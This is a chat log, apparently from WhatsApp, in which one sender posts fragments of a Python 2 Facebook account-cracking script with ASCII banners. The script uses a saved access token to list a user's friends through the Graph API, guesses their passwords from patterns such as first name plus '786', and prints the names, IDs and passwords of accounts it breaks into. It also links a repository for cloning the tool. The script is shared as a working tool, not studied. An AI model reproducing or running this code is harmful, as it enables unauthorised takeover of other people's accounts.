...
[10/12, 1:16 AM] BILALO DADX: !/usr//python2
#coding=utf-8
...
[10/12, 8:40 AM] BILALO DADX: if e =="":
			keluar()
		elif e =="y":
			login()
		else:
...
def get(data):
	...
	try:
		...
		a = json.loads(r.text)
[10/12, 8:47 AM] BILALO DADX: b.write(a['access_token'])
		b.close()
...
[10/12, 11:02 AM] BILALO DADX: berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
...
\033[1;96m  _______
 \033[1;95m| |  | |/ /\ \ |  _  /_____/_/    \_\_|  \_\_|\_\    
             git clone https://github.com/Badamala302/dad                    
...
loop = 'true'
[10/12, 11:17 AM] BILALO DADX: while (loop == 'true'):
...
def login():
	...
	time.sleep(0.05)
	pilih_login()
[10/12, 11:31 AM] BILALO DADX: def login1():
	os.system('clear')
	try:
		...
		if 'checkpoint' in url:
			...
			time.sleep(1)
			keluar()
[10/12, 11:51 AM] BILALO DADX: else:
...
def menu():
	...
	time.sleep(0.05)
	pilih()
[10/12, 12:02 PM] BILALO DADX: def pilih():
...
def pilih():
	...
	if unikers =="":
		...
		os.system('clear')
		print logo
		print "\033[1;95m...............\033[1;91mDataRes
[10/12, 5:26 PM] BILALO DADX: def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
[10/12, 5:31 PM] BILALO DADX: print "\033[1;97mвЂў-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------вЂў"
		print logo
		jalan('\033[1;97m[+]\033[1;91mMR-SH4DOWв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’..99%\033[1;97m:-:')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
...
[10/12, 5:43 PM] BILALO DADX: def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
...
[10/12, 5:54 PM] BILALO DADX: else:
			                                           if 'www.facebook.com' in q["error_msg"]:
...
[10/12, 6:19 PM] BILALO DADX: if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
				                                                               print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
				                                                               print '\x1b[1;97m[!] \x1b[1;91mPassword \x1b[1;97m: \x1b[1;97m' + pass6 + '\n'
...
[10/12, 6:29 PM] BILALO DADX: pass9 = b['first_name'] + '786'					
...
#Dev:DARK-STORM-BOYS
	...
	print """
 \033[1;97m
[10/12, 6:31 PM] BILALO DADX: \033[1;96m в–€в–€в–€в–€в–€в•— в–€в–€в•—      в–€в–€в–€в–€в–€в–€в•— в–€в–€в–€в•—   в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в•—
